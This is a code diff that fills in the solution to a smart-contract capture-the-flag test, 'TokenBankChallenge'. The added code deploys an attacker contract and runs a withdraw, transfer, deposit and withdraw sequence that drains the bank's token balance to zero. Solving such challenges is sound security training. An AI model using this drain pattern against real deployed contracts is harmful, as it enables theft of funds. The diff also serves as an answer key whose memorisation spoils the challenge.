@@ -21,13 +21,10 @@ describe('TokenBankChallenge', () => {
     ]);
 
     target = await targetFactory.deploy(attacker.address);
-
     await target.deployed();
 
     const tokenAddress = await target.token();
-
     token = await tokenFactory.attach(tokenAddress);
-
     await token.deployed();
 
     target = target.connect(attacker);
@@ -35,9 +32,18 @@ describe('TokenBankChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const attackFactory = await ethers.getContractFactory("TokenBankAttacker");
+    const attackContract = await attackFactory.deploy(target.address, token.address);
+    attackContract.attach(attacker.address);
+    await attackContract.deployed();
+    
+    const tokens = ethers.BigNumber.from(10).pow(18).mul(500_000);
+
+    await target.withdraw(tokens);
+    await token["transfer(address,uint256)"](attackContract.address, tokens);
+    await attackContract.deposit();
+    await attackContract.withdraw();
+    await attackContract.getMoney(attacker.address);
 
     expect(await token.balanceOf(target.address)).to.equal(0);
     expect(await token.balanceOf(attacker.address)).to.equal(
